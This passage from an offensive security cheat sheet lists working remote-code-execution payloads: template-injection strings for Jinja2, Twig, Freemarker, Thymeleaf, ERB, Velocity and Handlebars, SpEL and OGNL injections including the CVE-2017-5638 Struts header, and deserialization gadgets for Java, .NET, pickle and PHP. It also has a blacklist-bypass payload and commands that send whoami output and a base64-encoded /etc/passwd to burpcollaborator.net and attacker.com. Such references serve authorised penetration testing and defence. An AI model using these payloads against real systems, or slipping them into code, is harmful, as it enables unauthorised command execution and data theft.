#### Server-Side Template Injection (SSTI) Payloads

**Jinja2 (Python - Flask, Ansible):**

```python
# Detection
{{7*7}}                              # Returns 49
{{7*'7'}}                            # Returns 7777777

# Reconnaissance
{{config}}
{{config.items()}}
{{self}}
{%debug%}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Lipsum object abuse
{{lipsum.__globals__['os'].popen('whoami').read()}}

# Cycler object
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP - Symfony):**

```twig
# Detection
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Alternative
{{_self.env.enableDebug()}}
{{_self.env.isDebug()}}

# PHP filter chain (modern)
{{["id"]|filter("system")}}
```

**Freemarker (Java):**

```java
# Detection
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Alternative
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("java.lang.String"))>
${method.invoke(runtime,"whoami")}
```

**Thymeleaf (Java - Spring):**

```java
# Detection
[[${7*7}]]

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]

# Spring EL alternative
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**ERB (Ruby - Rails):**

```ruby
# Detection
<%= 7*7 %>

# RCE
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>
<%= %x(whoami) %>
```

**Velocity (Java):**

```java
# Detection
#set($x = 7 * 7)$x

# RCE
#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end
```

**Handlebars (JavaScript/Node.js):**

```javascript
# Detection
{{7*7}}

# RCE (if helper is vulnerable)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

#### Expression Language (EL) Injection

**Spring SpEL (Spring Framework):**

```java
# Detection
${7*7}
#{7*7}

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
#{T(java.lang.Runtime).getRuntime().exec('whoami')}

# Alternative methods
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}

# Bypass blacklist
${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"whoami"})}
```

**OGNL (Object-Graph Navigation Language - Struts):**

```java
# Detection
${7*7}

# RCE
${@java.lang.Runtime@getRuntime().exec('whoami')}

# CVE-2017-5638 (Content-Type exploitation)
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**MVEL (MVFLEX Expression Language):**

```java
# Detection
${7*7}

# RCE
Runtime.getRuntime().exec("whoami");
```

#### Deserialization Payloads

**Java (using ysoserial):**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64

# Popular gadget chains
ysoserial CommonsCollections1
ysoserial CommonsCollections6
ysoserial CommonsCollections7
ysoserial Spring1
ysoserial Spring2
ysoserial Jdk7u21
ysoserial Hibernate1
```

**.NET (using ysoserial.net):**

```bash
# Generate payload
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c whoami"

# Gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity
```

**Python pickle:**

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

**PHP serialize:**

```php
# Magic methods for exploitation
__wakeup()
__destruct()
__toString()

# Example payload
O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
```

### 3. Advanced Techniques

#### Blind RCE Detection

**Time-Based:**

```bash
# Linux
; sleep 10
| ping -c 10 127.0.0.1
| timeout 10

# Windows
| ping -n 10 127.0.0.1
& timeout /t 10
```

**Out-of-Band (OAST) using Burp Collaborator:**

```bash
# DNS exfiltration
; nslookup $(whoami).burpcollaborator.net
; dig $(whoami).burpcollaborator.net

# HTTP callback
; curl http://burpcollaborator.net
; wget http://burpcollaborator.net/$(whoami)

# DNS with data exfiltration
; cat /etc/passwd | base64 | xargs -I {} nslookup {}.burpcollaborator.net
```

